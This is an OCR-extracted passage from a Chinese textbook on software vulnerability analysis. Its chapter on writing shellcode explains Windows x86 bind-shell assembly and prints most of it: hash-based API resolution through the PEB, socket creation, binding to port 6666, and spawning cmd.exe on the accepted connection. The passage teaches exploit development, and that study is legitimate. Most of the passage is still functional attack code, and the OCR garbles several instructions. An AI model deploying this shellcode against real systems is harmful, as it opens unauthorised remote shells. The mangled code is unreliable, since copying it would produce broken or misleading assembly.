S
int
backlog
112
---
## Page 138
SOCKET accept(
3
SOCKET
B,
章
struct sockaddr*
addr,
int*
addrlen
开
发
shellcode
对于这两个函数，调用的关键是我们前边已经存在ebp中的socket，其他的参数还是一律
传NULL。accept函数将返回另一个socket用来表示客户端的连接，而bind和listen函数调用
成功时会返回0。注意到这一点之后，可用返回值是否是NULL来作为循环结束的条件，在一
个循环体中完成3次函数调用，而不是占用宝贵的shellcode空间来重复调用3次。读到这里，
的
您就能明白前边把函数地址按照调用的顺序在栈里摆放的好处了。这个部分的代码如下。
艺
术
call_loop:
push ebp
:saved SocKET descriptor
lodsd
call eax
:call the nextfunction
test eax,eax
:bind() and 1isten()return 0,
accept()returnsaSocKETdescriptor
jz call_loop
还缺一点就要大功告成了，我们还要接受客户端的连接，把cmd.exe作为子进程运行起来，
并且用客户端的socket作为这个进程的std句柄，最后正常退出。
CreateProcess函数有1O个参数，对我们而言，最关键的参数是STARTUPINFO结构体。
就是这个结构体指明了“cmd”字符串，并把客户端的socket作为其std句柄。
STARTUPINFO的大多数成员变量都可以是NULL，所以用栈区被置过NULL的区域来初
始化这个结构体。我们需要把STARTF_USESTDHANDLES标志位设为true，然后把客户端的
实如果不管stdert，还可以节省出一条单字节指令）。
;initialisea STARTUPINFOstructureatesp
incbyte ptr[esp+0x2d]
;set STARTF_USESTDHANDLES to true
subedi,0x6c
;point edi at hstdInput in
;STARTUPINFO
;set client socket as the stdin
;handle
;same for stderr (optional)
最后就是调用CreateProcess函数。这段代码需要解释的东西不多，只要注意选取最短小精
悍的指令就行。例如，由于栈中大片空间已经被设置NULL，故可以用单字节的短指令“popeax”
压入一个true，而不是双字节的指令“push1”。
由于PROCESSINFORMATION结构体是一个[out]型的参数，可以把它指向栈区的[in]参数
113
---
## Page 139
day
0
STARTUPINFO结构体。
安
popeax
;seteax=O（STARTUPINFO now at esp+4)
全
push esp
;uSe StaCk aS PROCESSINFORMATION
：
软件
;structure(STARTUPINFOnowbacktoesp)
push esp
:STARTUPINFO struCture
pusheax
:lpCurrentDirectory =NULL
漏
push eax
;lpEnvironment=NULL
洞
分析
push eax
;dwCreationFlags =NULL
push esp
;bInheritHandles= true
push eax
;lpThreadAttributes=NULL
技
push eax
;lpProceBsAttributes=NULL
术
push esi
:lpCommandLine="cmd*
（第
push eax
;lpApplicationName=NULL
2
call[esi-0xlc]
:CreateProcessA
版
现在，客户端已经能获得一个shell了，当然最后还要调用exit函数让程序能够正常地退出。
cal1[esi-0x18]
ExitProce-ssa
完整的代码实现如下。
;start of shellcode
;assume:eax points here
;function hashes (executable as nop-equivalent)
_emit0x59
;LoadLibraryA;pop ecx
_emit 0x81
:CreateProcessA;orecx,0x203062d3
_emit 0xc9
;ExitProcess
_emit 0xd3
;WSAStartup
_emit0x62
;WSASocketA
_emit0x30
;bind
_emit0x20
;listen
_emit0x41
:accept;inc ecx
;"CMd"
_emit0x43
;incebx
_emit 0x4d
;decebp
_emit0x64
;start of proper code
cdq
:setedx=O(eaxpointsto stack so
:is le8s than 0x80000000)
xchg eax,esi
:esi=addr of first function hash
leaedi,[esi-0x18]
:edi = addr to start writing function
;addresses(lastaddrwillbewritten
:justbefore"cmd")
;find base addrofkernel32.dll
114
---
## Page 140
第
mov ebx,fs:[edx+0x30]
;ebx=address of PEB
3
mov ecx,[ebx+0x0c]
:ecx=pointer toloaderdata
章
movecx,[ecx+0xlc]
:ecx=first entry in initialisation
;order list
开
movecx,[ecx]
:ecx= second entry inlist
发
:(kerne132.d11)
shellcode
movebp,[ecx+0x08]
:ebp=base address of kernel32.dl1
;make some stack space
mov dh,0x03
;sizeof（WSADATA)is0x190
sub esp,edx
的
艺
:push a pointer to"ws2_32onto stack
术
movdx,0x3233
:rest of edx is null
push edx
push0x5f327377
pushesp
find_lib_functions:
lodsb
;load next hash into al and increment
:esi
cmp al,0xd3
;hash of wsAStartup - trigger
;LoadLibrary("ws2_32")
jne find_functions
xchg eax,ebp
:save current hash
call[edi-0xc]
;LoadLibraryA
xchg eax,ebp
:restore current hash,and update ebp
;with base address of ws2_32.dl1
push edi
;save location of addr of first
:winsock function
find_functions:
pushad
;preserve registers
mov eax，[ebp+0x3c]
;eax= start of PE header
movecx,[ebp+eax+0x78]
:ecx=relative offset of export table
add ecx,ebp
mov ebx,[ecx+0x20]
:ebx=relative offset of namestable
add ebx,ebp
:ebx=absolute addr of names table
xor edi,edi
:edi will count through the functions
next_function_loop:
incedi
;increment function counter
movesi，[ebx+edi*4]
;esi=relative offset of current
;function name
add esi,ebp
;esi=absolute addr of current function
115
---
## Page 141
0
day
;name
安全
cdo
:dlwill hold hash （we know eax is
;small)
**
软件
hash_loop:
lodsb
;load next char into al and increment
漏
:esi
洞分析技术
xoral,0x71
:xoR current char with 0x71
sub dl,al
;update hash with current char
cmp al,0x71
;loop until wereach end of string
jne hash_loop
cmp dl,[esp+0x1c]
:compareto the requested hash(saved
（第
;on stack from pushad)
jnznext_function_loop
2
版
;we now have the right function
movebx,
[ecx+0x24]
;ebx = relative offset of ordinals
:table
add ebx,ebp
;ebx=absoluteaddrofordinals
;table
movdi,[ebx+2edi]
:di=ordinalnumberofmatched
:function
movebx,[ecx+0xlc]
;ebx=relativeoffset of address
;table
add ebx,ebp
:ebx=absolute addr of address table
addebp,[ebx+4*edi]
:add to ebp （base addr of module)the
;relative offset of matched function
xchg eax,ebp
:move func addr into eax
popedi
;edi islast onto stack in pushad
stosd
;write function addr to[edi]and
:increment edi
pushedi
pedod
;restore registers
cmp esi，edi
;loopuntilwereach end of last hash
jne find_lib_functions
popesi
;saved location of first winsock
;function
;we will lodsd and call each func in
:sequence
:initialize winsock
116
---
## Page 142
第
push esp
;use stack for WSADATA
3
push 0x02
:wVersionRequested
章
lodsd
calleax
;WSAStartup
开
发
;null-terminate"cmd"
shellcode
mov byte ptr [esi+ 0x13],al;eax=0 if wSAStartup()worked
;clear some stack to use as NULL parameters
leaecx,[eax+0x30]
;siZeOf(STARTUPINFO)=0x44,
movedi,esp
的
;eax is still0
艺
:create socket
术
inceax
push eax
;tyPe=1（SOCK_STREAM)
inc eax
push eax1af=2（AF_INET)
lodsd
call eax ;WSASocketA
xchg ebp,eax
;save SocKET descriptor in ebp (safe
;from being changed by remaining API
:calls)
;push bind parameters
mov eax,0x0alaff02
;0x1a0a=port6666,0x02=AF_INET
xor ah,ah
;remove the ff from eax
push eax
;we use 0x0ala0002 as both the name
:（struct sockaddr)and namelen (which
:only needsto be large enough)
push esp
:pointer to our sockaddr struct
:callbind(),listen()and accept()in turn
call_loop:
pushebp
:8aved socKETdescriptor(we
;implicitly pass NULL for all other
:params)
lodsd
call eax
;call the next function
test eax,eax